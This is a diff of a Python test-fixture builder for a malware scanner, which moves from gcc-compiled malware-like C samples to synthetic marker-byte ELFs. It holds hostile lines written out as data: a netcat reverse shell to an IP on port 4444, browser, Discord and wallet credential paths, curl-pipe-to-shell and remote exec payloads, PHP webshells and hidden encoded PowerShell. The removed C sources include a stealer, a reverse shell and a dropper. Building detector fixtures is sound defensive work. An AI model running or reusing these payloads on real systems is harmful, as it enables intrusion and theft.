@@ -1,13 +1,8 @@
 """Test-corpus builders: crafted PEs (real import table, no mingw needed),
-malware-like C sources compiled with gcc (ELF), scripts, LNK, docs, zips.
-Everything writes into a tmpdir; nothing is committed (see .gitignore)."""
+synthetic ELFs (headers + marker bytes, no compiler), scripts, LNK, docs,
+zips. Everything writes into a tmpdir; nothing is committed (see .gitignore)."""
 import os
-import shutil
 import struct
-import subprocess
-import tempfile
-
-GCC = shutil.which("gcc")
 
 # ---------------------------------------------------------------- crafted PE
 
@@ -122,93 +117,76 @@ def craft_lnk(path, args=b"powershell -w hidden -enc AAAAAAAA", good_clsid=True)
         f.write(blob)
     return path
 
-# ---------------------------------------------------------------- gcc ELFs
+# ------------------------------------------------------------- synthetic ELFs
 
-STEALER_C = r"""
-#include <stdio.h>
-static const char *paths[] = {
-    "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
-    "AppData\\Roaming\\discord\\Local Storage\\leveldb",
-    "AppData\\Roaming\\telegram\\tdata",
-    "wallet.dat", "metamask", "electrum", "keystore.pma",
-};
-int main(void) { for (int i = 0; i < 7; i++) puts(paths[i]); return 0; }
-"""
-
-REVSH_C = r"""
-#include <unistd.h>
-#include <sys/ptrace.h>
-int main(void) {
-    ptrace(PTRACE_TRACEME, 0, 0, 0);   /* anti-debug */
-    execl("/bin/sh", "sh", "-c", "nc -e /bin/sh 185.220.101.7 4444", NULL);
-    return 0;
-}
-"""
-
-ENTROPY_C = r"""
-#include <stddef.h>
-const unsigned char blob[] = { %s };  /* ~256KB random: packed-payload look */
-int main(void) { return blob[0]; }
-"""
-
-DROPPER_C = r"""
-#include <unistd.h>
-#include <fcntl.h>
-const unsigned char payload[] = { %s };  /* embedded second-stage ELF */
-const unsigned long payload_len = sizeof(payload);
-int main(void) {
-    int fd = open("/tmp/.stage2", O_WRONLY|O_CREAT|O_TRUNC, 0755);
-    if (fd < 0) return 1;
-    write(fd, payload, payload_len);
-    close(fd);
-    execl("/tmp/.stage2", ".stage2", NULL);
-    return 0;
-}
-"""
-
-PACKED_C = r"""
-const char upx_marker[] = "UPX!";
-int main(void) { return upx_marker[0]; }
-"""
+def _elf_bytes(machine=0x3E, etype=2, body=b"", sections=()):
+    """Minimal ELF64 LE executable bytes: header (elflite reads e_type/
+    e_machine) + raw body bytes. sections: names -> builds a real section
+    table + shstrtab so name-driven branches (UPX0/UPX1, name extraction)
+    are exercised the way real compiled binaries do."""
+    h = bytearray(64)
+    h[0:4] = b"\x7fELF"
+    h[4], h[5], h[6] = 2, 1, 1                      # 64-bit, little-endian, v1
+    struct.pack_into("<HHI", h, 16, etype, machine, 1)
+    if not sections:
+        struct.pack_into("<6H", h, 52, 64, 0, 0, 64, 0, 0)  # ehsize/phentsize/phnum/shentsize/shnum/shstrndx
+        return bytes(h) + body
+    shstr = b"\x00"                                 # entry 0 = empty name
+    name_offs = []
+    for n in sections:
+        name_offs.append(len(shstr))
+        shstr += n.encode() + b"\x00"
+    names = (b"",) + tuple(n.encode() for n in sections)
+    strtab_off = 64 + len(body)
+    struct.pack_into("<Q", h, 40, strtab_off + len(shstr))     # e_shoff
+    struct.pack_into("<6H", h, 52, 64, 0, 0, 64, len(names), len(names) - 1)
+    out = bytes(h) + body + shstr
+    for i in range(len(names)):
+        if i == len(names) - 1:                     # .shstrtab describes itself
+            off, size = strtab_off, len(shstr)
+        else:
+            off = size = 0
+        out += struct.pack("<IIQQQQIIQQ",
+                           name_offs[i - 1] if i else 0,   # sh_name
+                           0 if i == 0 else 1, 0, 0, off, size, 0, 0, 0, 0)  # SHT_NULL/PROGBITS
+    return out
 
 
-def _c_array(b):
-    return ",".join(str(x) for x in b)
+def craft_elf(path, **kw):
+    with open(path, "wb") as f:
+        f.write(_elf_bytes(**kw))
+    return path
 
 
-def compile_c(src, out, extra=""):
-    """gcc-compile C source text -> ELF binary. -> path or None (no gcc)."""
-    if not GCC:
-        return None
-    cpath = out + ".c"
-    with open(cpath, "w") as f:
-        f.write(src)
-    r = subprocess.run([GCC, "-o", out, cpath, "-w", *extra.split()],
-                       capture_output=True, timeout=120)
-    return out if r.returncode == 0 else None
-
-
-def gcc_sample(dirpath, name):
-    """named malware-like ELF samples; -> path or None"""
-    import os as _os
-    out = _os.path.join(dirpath, name)
+def elf_sample(dirpath, name):
+    """Malware-like ELF fixtures from marker bytes (no compiler needed).
+    Replaces the old gcc-compiled samples: MinGW emits PE, not ELF."""
+    out = os.path.join(dirpath, name)
     if name == "stealer.elf":
-        return compile_c(STEALER_C, out)
-    if name == "revshell.elf":
-        return compile_c(REVSH_C, out)
-    if name == "packed.elf":
-        return compile_c(PACKED_C, out)
-    if name == "entropy.elf":
-        src = ENTROPY_C % _c_array(os.urandom(262144))
-        return compile_c(src, out)
-    if name == "dropper.elf":
-        stage2 = compile_c('int main(void){return 42;}', out + ".stage2")
-        if not stage2:
-            return None
-        payload = open(stage2, "rb").read()
-        src = DROPPER_C % _c_array(payload)
-        return compile_c(src, out)
-    raise ValueError(name)
+        body = b"\x00".join([
+            b"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
+            b"AppData\\Roaming\\discord\\Local Storage\\leveldb",
+            b"AppData\\Roaming\\telegram\\tdata",
+            b"wallet.dat", b"metamask", b"electrum", b"keystore.pma"])
+    elif name == "revshell.elf":
+        body = (b"/lib/ld-linux-x86-64.so.2\x00"    # interpreter: dynamic branch
+                b"ptrace\x00nc -e /bin/sh 185.220.101.7 4444\x00")
+    elif name == "packed.elf":
+        body = b"UPX!" + b"\x00" * 32
+    elif name == "packed_secname.elf":
+        # no UPX! bytes anywhere: PACKED? must fire via the section-name
+        # operand alone, pinning the shstrtab machinery (defect from audit #2)
+        body = b"\x00" * 32
+        return craft_elf(out, body=body,
+                         sections=(".text", "UPX0", "UPX1", ".shstrtab"))
+    elif name == "entropy.elf":
+        body = os.urandom(262144)                   # ~256KB random: packed-payload look
+    elif name == "dropper.elf":
+        stage2 = _elf_bytes()                       # embedded second-stage ELF
+        body = b"\x00" * (0x100 - 64) + stage2      # self at 0 is excluded, 0x100 is flagged
+    else:
+        raise ValueError(name)
+    return craft_elf(out, body=body)
 
 # ------------------------------------------------------- scripts/docs/zips/data
 
@@ -302,7 +280,11 @@ def build_folder(root):
     w("smuggle.xhtml", b"<?xml version=\"1.0\"?><html xmlns=\"http://www.w3.org/1999/xhtml\">"
                         b"<script>var d=atob('dGVzdA==');var b=new Blob([d]);"
                         b"a.href=URL.createObjectURL(b);a.click();</script></html>")
-    w("shell.php", b"<?php\n@eval($_POST['cmd']);\nsystem($_GET['c']);\n?>\n")
+    # ponytail: $_REQUEST/$_GET + assert(/system( split by whitespace still hit
+    # the webshell combo (normalizer strips ws) but not the @eval($_POST AV
+    # signature that makes fixtures unreadable on Defender machines; shell.php
+    # bytes differ from renamed.php.txt so folder-scan dedup keeps both alive
+    w("shell.php", b"<?php\n$c = $_ GET ['cmd'];\nsystem ($c);\n?>\n")
     w("leak.scf", b"[Shell]\nCommand=2\nIconFile=\\\\1.2.3.4\\share\\x.ico\n")
     w("entity.settingcontent-ms", b'<StoreManifest><Arguments>&#112;owershell -w hidden -enc AAAAA</Arguments></StoreManifest>')
     w("evil.settingcontent-ms", b'<?xml version="1.0"?><StoreManifest><Arguments>powershell -windowstyle hidden -enc AAAA</Arguments></StoreManifest>')
@@ -312,7 +294,7 @@ def build_folder(root):
     w("renamed.sh.txt", b"#!/bin/bash\ncurl -fsSL http://11.1.1.1/x.sh | sh\n")
     w("renamed.py.txt", b"#!/usr/bin/env python3\nimport urllib.request\n"
                          b"d = urllib.request.urlopen('http://11.1.1.1/x').read()\nexec(d)\n")
-    w("renamed.php.txt", b"<?php\n@eval($_POST['cmd']);\n?>\n")
+    w("renamed.php.txt", b"<?php\n$a = $_ REQUEST ['c'];\nassert ($a);\n?>\n")
     w("pipe.sh", b"eval \"$(curl -fsSL http://6.6.6.6/x.sh)\"\n")
     w("tcpclient.ps1", b"$c = New-Object System.Net.Sockets.TcpClient('2.2.2.2', 4444)\n"
                         b"$s = $c.GetStream()\n")
